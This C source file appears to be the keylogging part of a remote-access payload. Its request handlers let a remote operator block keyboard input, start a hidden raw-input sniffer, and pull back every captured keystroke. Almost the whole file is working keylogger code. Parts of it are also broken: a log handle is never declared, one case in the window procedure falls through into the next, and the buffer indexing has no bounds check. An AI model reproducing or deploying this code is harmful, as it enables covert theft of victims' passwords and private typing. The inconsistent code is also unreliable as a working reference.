#include "precomp.h"

#include <tchar.h>

extern HMODULE hookLibrary;
extern HINSTANCE hAppInstance;

/*
 * Enables or disables keyboard input
 */
DWORD request_ui_enable_keyboard(Remote *remote, Packet *request)
{
	Packet *response = packet_create_response(request);
	BOOLEAN enable = FALSE;
	DWORD result = ERROR_SUCCESS;

	enable = packet_get_tlv_value_bool(request, TLV_TYPE_BOOL);

	// If there's no hook library loaded yet
	if (!hookLibrary)
		extract_hook_library();

	// If the hook library is loaded successfully...
	if (hookLibrary)
	{
		DWORD (*enableKeyboardInput)(BOOL enable) = (DWORD (*)(BOOL))GetProcAddress(
				hookLibrary, "enable_keyboard_input");

		if (enableKeyboardInput)
			result = enableKeyboardInput(enable);
	}
	else
		result = GetLastError();

	// Transmit the response
	packet_transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

typedef enum { false=0, true=1 } bool;

bool boom[1024];
const char g_szClassName[] = "klwClass";
HANDLE tKeyScan = NULL;
char *KeyScanBuff = NULL;
int KeyScanSize = 1024*1024;
int KeyScanIndex = 0;

void ui_keyscan_now(bool listStates[2][256], bool *iToggle) {
    unsigned int iKey = 0;

	TCHAR strLog[8] = {0};
    for (iKey = 0; iKey < 255; ++iKey)
    {
		bool bPrior, bState;
		DWORD tog = *iToggle;
        SHORT iState = GetAsyncKeyState(iKey);
        listStates[tog][iKey] = iState < 0;
		bPrior = listStates[!tog][iKey];
        bState = listStates[tog][iKey];

        // detect state change
        if (bPrior ^ bState && bState == 1)
        {
			unsigned char flags = (1<<0);

			TCHAR toHex[] = _T("0123456789ABCDEF");
            bool bShift = listStates[tog][VK_SHIFT];
            bool bCtrl = listStates[tog][VK_CONTROL];
            bool bAlt = listStates[tog][VK_MENU];
/*
			strLog[0] = bShift ? 'S' : 's';
			strLog[1] = bCtrl  ? 'C' : 'c';
			strLog[2] = bAlt   ? 'A' : 'a';
			strLog[3] = toHex[(iKey >> 4) & 0xF];
			strLog[4] = toHex[(iKey & 0xF)];
			strLog[5] = ';';
			strLog[6] = '\r';
			strLog[6] = '\n';
			OutputDebugString(strLog);
*/
			if(bShift) flags |= (1<<1);
			if(bCtrl)  flags |= (1<<2);
			if(bAlt)   flags |= (1<<3);

			if(KeyScanIndex >= KeyScanSize) KeyScanIndex = 0;
			KeyScanBuff[KeyScanIndex+0] = flags;
			KeyScanBuff[KeyScanIndex+1] = iKey;
			KeyScanIndex += 2;
        }
    }
    *iToggle = !*iToggle;
}

void ui_keyscan_proc(void) {
    bool iToggle = false;
    bool listStates[2][256] = {0};

	if(KeyScanBuff) {
		free(KeyScanBuff);
		KeyScanBuff = NULL;
		KeyScanIndex = 0;
	}

	KeyScanBuff = calloc(KeyScanSize, sizeof(char));
	while(1) {
		ui_keyscan_now(listStates, &iToggle);
		Sleep(30);
	}
}



/*
 *  key logger updates begin here
 */

int WINAPI ui_keylog_proc()
{
    WNDCLASSEX klwc;
    HWND hwnd;
    MSG msg;

    // register window class
    ZeroMemory(&klwc, sizeof(WNDCLASSEX));
    klwc.cbSize        = sizeof(WNDCLASSEX);
    klwc.lpfnWndProc   = ui_keylog_wndproc;
    klwc.hInstance     = hAppInstance;
    klwc.lpszClassName = g_szClassName;
    
    if(!RegisterClassEx(&klwc))
    {
        return 0;
    }
    
    // create message-only window
    hwnd = CreateWindowEx(
        0,
        g_szClassName,
        NULL,
        0,
        0, 0, 0, 0,
        HWND_MESSAGE, NULL, hAppInstance, NULL
    );

    if(!hwnd)
    {
        return 0;
    }
    
    // message loop
    while(GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return msg.wParam;
}

LRESULT CALLBACK ui_keylog_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    UINT dwSize;
    RAWINPUTDEVICE rid;
    RAWINPUT *buffer;
    
    switch(msg)
    {
    	// register raw input device
        case WM_CREATE:
            rid.usUsagePage = 0x01;
            rid.usUsage = 0x06;
            rid.dwFlags = RIDEV_INPUTSINK;
            rid.hwndTarget = hwnd;
            
            if(!RegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE)))
            {
                return -1;
            }
            
        case WM_INPUT:
            // request size of the raw input buffer to dwSize
            GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize,
                sizeof(RAWINPUTHEADER));
        
            // allocate buffer for input data
            buffer = (RAWINPUT*)HeapAlloc(GetProcessHeap(), 0, dwSize);
        
            if(GetRawInputData((HRAWINPUT)lParam, RID_INPUT, buffer, &dwSize,
                sizeof(RAWINPUTHEADER)))
            {
                // if this is keyboard message and WM_KEYDOWN, log the key
                if(buffer->header.dwType == RIM_TYPEKEYBOARD
                    && buffer->data.keyboard.Message == WM_KEYDOWN)
                {
                    if(ui_log_key(buffer->data.keyboard.VKey) == -1)
                        DestroyWindow(hwnd);
                }
            }
        
            // free the buffer
            HeapFree(GetProcessHeap(), 0, buffer);
            break;
            
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
            
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

/*
 * Starts the keyboard sniffer
 */
DWORD request_ui_start_keyscan(Remote *remote, Packet *request)
{
	Packet *response = packet_create_response(request);
	DWORD result = ERROR_SUCCESS;

	if(tKeyScan) {
		result = 1;
	} else {
		// Make sure we have access to the input desktop
		if(GetAsyncKeyState(0x0a) == 0) {
			tKeyScan = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) ui_keylog_proc, NULL, 0, NULL);
		} else {
			// No permission to read key state from active desktop
			result = 5;
		}
	}

	// Transmit the response
	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

/*
 * Stops they keyboard sniffer
 */
DWORD request_ui_stop_keyscan(Remote *remote, Packet *request)
{
	Packet *response = packet_create_response(request);
	DWORD result = ERROR_SUCCESS;
	
	if(tKeyScan) {
		TerminateThread(tKeyScan, 0);
		tKeyScan = NULL;
	} else {
		result = 1;
	}

	// Transmit the response
	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

/*
 * Returns the sniffed keystrokes
 */
DWORD request_ui_get_keys(Remote *remote, Packet *request)
{
	Packet *response = packet_create_response(request);
	DWORD result = ERROR_SUCCESS;
	
	if(tKeyScan) {
		// This works because NULL defines the end of data (or if its wrapped, the whole buffer)
		packet_add_tlv_string(response, TLV_TYPE_KEYS_DUMP, KeyScanBuff);
		memset(KeyScanBuff, 0, KeyScanSize);
		KeyScanIndex = 0;
	} else {
		result = 1;
	}

	// Transmit the response
	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

/*
 * log keystrokes
 * DO NOT REMOVE THIS UNTIL YOU ARE FAIRLY CERTAIN POTENTIAL OVERFLOWS ARE DEALT WITH
 * remove text file logging code along with any ref to hLog and simply concatenate 
 * everything into KeyScanBuff
 */

int ui_log_key(UINT vKey)
{
    DWORD dwWritten;
    BYTE lpKeyboard[256];
    char szKey[32];
    WORD wKey;
    char buf[32];
    int len;
        
    // Convert virtual-key to ascii
    GetKeyState(VK_CAPITAL); GetKeyState(VK_SCROLL); GetKeyState(VK_NUMLOCK);
    GetKeyboardState(lpKeyboard);
    
    len = 0;
    switch(vKey)
    {
        case VK_BACK:
            len = wsprintf(buf, "[BP]");
            break;
        case VK_RETURN:
            len = 2;
            strcpy(buf, "\r\n");
            break;
        case VK_SHIFT:
            break;
        default:
            if(ToAscii(vKey, MapVirtualKey(vKey, 0), lpKeyboard, &wKey, 0) == 1)
                len = wsprintf(buf, "%c", (char)wKey);
            else if(GetKeyNameText(MAKELONG(0, MapVirtualKey(vKey, 0)), szKey, 32) > 0)
                len = wsprintf(buf, "[%s]", szKey);
            break;
    }

    // Write buf into the log
    if(len > 0)
    {
        if(!WriteFile(hLog, buf, len, &dwWritten, NULL))
            return -1;
    }
        
    return 0;
}

/*
 * DO NOT REMOVE THIS UNTIL YOU ARE FAIRLY CERTAIN POTENTIAL OVERFLOWS ARE DEALT WITH
 */